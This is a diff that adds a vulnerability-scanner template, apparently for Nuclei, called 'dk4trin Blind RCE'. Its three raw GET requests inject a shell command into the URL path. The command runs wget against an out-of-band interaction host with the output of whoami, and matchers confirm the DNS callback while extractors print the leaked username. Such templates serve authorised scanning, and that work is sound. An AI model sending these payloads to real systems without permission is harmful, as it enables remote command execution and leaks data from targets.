@@ -1,0 +1,43 @@
+id: blind-rce-dk4trin
+
+info:
+  name: dk4trin Blind RCE
+  author: dk4trin
+  severity: high
+  description: Blind RCE
+  tags: rce,jndi,oast,blind
+
+requests:
+  - raw:
+      - |
+        GET /;wget $(whoami).{{interactsh-url}} HTTP/1.1
+        Host: {{hostname}}
+        Content-Type: application/x-www-form-urlencoded
+
+      - |
+        GET /;wget $(whoami).{{interactsh-url}} HTTP/1.1
+        Host: {{hostname}}
+        Content-Type: text/html
+
+      - |
+        GET /;wget $(whoami).{{interactsh-url}} HTTP/1.1
+        Host: {{hostname}}
+
+    matchers-condition: and
+    matchers:
+      - type: word
+        part: interactsh_protocol  # Confirms the DNS Interaction
+        words:
+          - "dns"
+
+      - type: regex
+        part: interactsh_request
+        regex:
+          - '([a-zA-Z0-9\.\-]+)\.([a-z0-9]+)\.([a-z0-9]+)\.\w+' # Match for extracted ${hostName} variable
+
+    extractors:
+      - type: regex
+        part: interactsh_request
+        group: 1
+        regex:
+          - '([a-zA-Z0-9\.\-]+)\.([a-z0-9]+)\.([a-z0-9]+)\.\w+'   # Print extracted ${hostName} in output
